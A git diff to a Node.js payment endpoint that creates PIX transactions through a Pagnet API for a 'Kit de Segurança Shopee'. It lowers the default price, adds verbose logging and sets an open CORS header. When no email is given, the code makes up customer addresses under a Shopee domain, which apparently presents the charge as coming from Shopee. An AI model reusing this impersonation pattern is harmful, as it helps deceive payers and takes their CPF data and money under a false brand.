@@ -227,7 +227,7 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
     console.log('Iniciando transação Pagnet no Heroku...');
     
     // Processar os dados recebidos
-    const { name, cpf, email, phone, amount = 59.90, description = "Kit de Segurança Shopee" } = req.body;
+    const { name, cpf, email, phone, amount = 47.40, description = "Kit de Segurança Shopee" } = req.body;
     
     if (!name || !cpf) {
       return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
@@ -237,6 +237,7 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
     const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
     
     console.log('Dados recebidos:', { name, cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`, amount });
+    console.log('Enviando payload para Pagnet API...');
     
     // Integração direta com Pagnet API
     const baseUrl = 'https://api.pagnetbrasil.com/v1';
@@ -267,8 +268,6 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
       externalReference: `PIX${Date.now()}${Math.floor(Math.random() * 10000)}`
     };
     
-    console.log('Enviando payload para Pagnet API...');
-    
     // Fazer requisição para Pagnet
     const fetch = (await import('node-fetch')).default;
     const response = await fetch(`${baseUrl}/transactions`, {
@@ -281,7 +280,10 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
       body: JSON.stringify(payload)
     });
     
+    console.log('Response status da Pagnet:', response.status);
+    
     const responseData = await response.json();
+    console.log('Response data da Pagnet:', JSON.stringify(responseData, null, 2));
     
     if (!response.ok) {
       console.error('Erro da Pagnet API:', response.status, responseData);
@@ -295,8 +297,11 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
     const transactionId = responseData.id;
     const pixCode = responseData.pix?.qrcode || '';
     
+    console.log('Transaction ID extraído:', transactionId);
+    console.log('PIX Code extraído:', pixCode ? 'ENCONTRADO' : 'NÃO ENCONTRADO');
+    
     if (!pixCode) {
-      console.error('PIX code não encontrado na resposta da Pagnet');
+      console.error('PIX code não encontrado na resposta da Pagnet. Resposta completa:', responseData);
       return res.status(500).json({ error: 'Erro ao gerar código PIX' });
     }
     
@@ -313,10 +318,16 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
     };
     
     console.log('✅ Transação Pagnet criada com sucesso:', transactionId);
-    res.json(pixResponse);
+    console.log('Enviando resposta para frontend:', JSON.stringify(pixResponse, null, 2));
+    
+    // Garantir que a resposta seja enviada corretamente
+    res.setHeader('Content-Type', 'application/json');
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.status(200).json(pixResponse);
     
   } catch (error) {
     console.error('Erro ao processar pagamento Pagnet:', error);
+    res.setHeader('Content-Type', 'application/json');
     res.status(500).json({
       error: 'Erro interno do servidor ao processar pagamento',
       message: error.message
